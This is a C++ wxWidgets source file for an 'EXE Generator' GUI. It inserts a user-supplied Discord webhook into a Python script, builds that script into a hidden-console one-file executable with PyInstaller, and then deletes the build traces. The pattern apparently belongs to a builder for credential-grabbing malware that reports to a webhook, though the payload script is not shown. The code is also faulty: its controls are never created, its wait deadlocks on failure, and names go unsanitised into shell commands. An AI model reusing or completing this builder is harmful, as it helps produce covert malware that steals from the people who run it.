
// Function to check if command executed successfully
bool isCommandSuccessful(const std::string& cmd) {
    int result = system(cmd.c_str());
    return result == 0;
}

void installRequirements() {
    std::cout << "Installing required packages..." << std::endl;
    if (!isCommandSuccessful("python -m pip install -r requirements.txt")) {
        std::cout << "PLEASE MAKE SURE YOU ARE CONNECTED TO THE INTERNET AND HAVE THE requirements.txt IN THE SAME DIRECTORY!" << std::endl;
        system("pause");
        exit(1);
    }
    std::cout << "Required packages installed successfully!" << std::endl;
}

class MyApp : public wxApp {
public:
    virtual bool OnInit();
};

class MyFrame : public wxFrame {
public:
    MyFrame(const wxString& title, const wxPoint& pos, const wxSize& size);

private:
    void OnButtonGenerate(wxCommandEvent& event);
    void UpdateProgressBar(int progress);
    void OnThreadCompletion();

    wxTextCtrl* txtWebhook;
    wxTextCtrl* txtExeName;
    wxButton* btnGenerate;
    wxGauge* progressBar;

    std::condition_variable cv;
    std::mutex cvMutex;
    bool isExeGenerated;

    wxDECLARE_EVENT_TABLE();
};

enum {
    ID_BTN_GENERATE = wxID_HIGHEST + 1
};

wxBEGIN_EVENT_TABLE(MyFrame, wxFrame)
EVT_BUTTON(ID_BTN_GENERATE, MyFrame::OnButtonGenerate)
wxEND_EVENT_TABLE()

bool MyApp::OnInit() {
    MyFrame* frame = new MyFrame("EXE Generator", wxPoint(50, 50), wxSize(450, 250));
    frame->Show(true);
    return true;
}

MyFrame::MyFrame(const wxString& title, const wxPoint& pos, const wxSize& size)
    : wxFrame(NULL, wxID_ANY, title, pos, size)
{
// join discord
}

void MyFrame::OnButtonGenerate(wxCommandEvent& event) {
    wxString webhook = txtWebhook->GetValue();
    wxString exeName = txtExeName->GetValue();

    if (webhook.empty() || exeName.empty()) {
        wxMessageBox("Both webhook URL and .exe name must be provided.", "Error", wxICON_ERROR | wxOK);
        return;
    }

    installRequirements(); // Install required packages

    // Reset the flag before starting the thread
    isExeGenerated = false;

    std::thread([=]() {
        std::string psCmd = "powershell -Command \"(Get-Content builder.py) -replace 'Your Webhook', '" + webhook.ToStdString() + "' | Set-Content builder_temp.py\"";
        if (!isCommandSuccessful(psCmd)) {
            wxMessageBox("Failed to generate builder_temp.py.", "Error", wxICON_ERROR | wxOK);
            return;
        }

        std::cout << "Generating EXE..." << std::endl;
        std::string pyinstallerCmd = "pyinstaller --clean --onefile --noconsole -i NONE -n " + exeName.ToStdString() + " builder_temp.py";

        const int totalSteps = 100; // Set the total steps for the progress bar
        for (int step = 0; step <= totalSteps; ++step) {
            wxQueueEvent(this, new wxThreadEvent(wxEVT_THREAD, ID_BTN_GENERATE)); // Update progress bar on the main thread
            if (isCommandSuccessful(pyinstallerCmd)) {
                isExeGenerated = true;
                cv.notify_one(); // Notify the main thread that the EXE is generated
                break; // The command was successful, so we can exit the loop
            }
        }

        if (!isExeGenerated) {
            cv.notify_one(); // Notify the main thread about the failure
        }
        }).detach(); // Detach the thread to allow it to run independently

        // Wait for the thread to complete or fail
        std::unique_lock<std::mutex> lock(cvMutex);
        cv.wait(lock, [this] { return isExeGenerated; });

        // At this point, the thread has completed, and the EXE is either generated or failed
        if (isExeGenerated) {
            // Delete builder_temp and other files
            system("del /f /q builder_temp.py");
            system("rmdir /s /q __pycache__");
            system("rmdir /s /q build");
            system(("del /f /q " + exeName.ToStdString() + ".spec").c_str());

            wxMessageBox("EXE Generated as " + exeName + ".exe", "Success", wxICON_INFORMATION | wxOK);
        }
        else {
            wxMessageBox("Failed to generate EXE.", "Error", wxICON_ERROR | wxOK);
        }
}

void MyFrame::UpdateProgressBar(int progress) {
    if (progress >= 0 && progress <= 100) {
        progressBar->SetValue(progress);
    }
}

void MyFrame::OnThreadCompletion() {
    // JOIN DISCORD
}

wxIMPLEMENT_APP(MyApp);
